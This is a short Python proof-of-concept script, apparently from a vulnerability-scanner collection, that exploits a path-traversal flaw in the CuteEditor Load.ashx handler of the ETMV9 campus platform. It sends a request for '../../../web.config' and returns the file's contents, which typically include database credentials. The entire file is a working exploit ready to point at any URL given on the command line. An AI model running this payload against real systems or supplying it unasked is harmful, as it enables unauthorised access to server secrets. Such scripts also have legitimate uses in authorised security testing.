#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ETMV9数字化校园平台任意下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0100796
author: Lucifer
description: 该校园平台使用了第三方编辑器CuteEditor，虽然删除了存在任意文件上传的漏洞文件uploader.ashx
        （具体利用可参考白帽子zcgonvh的http://**.**.**.**/bugs/wooyun-2010-061932），与目录遍历漏洞文件browse_Img.asp，但是却忽略了任意文件包含漏洞文件Load.ashx。
'''
import sys
import requests
import warnings
from termcolor import cprint

class etmdcp_Load_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在ETMV9数字化校园平台任意下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True,vulnurl,"ETMV9数字化校园平台任意下载",payload,req.text
            else:
                cprint("[-]不存在etmdcp_Load_filedownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = etmdcp_Load_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()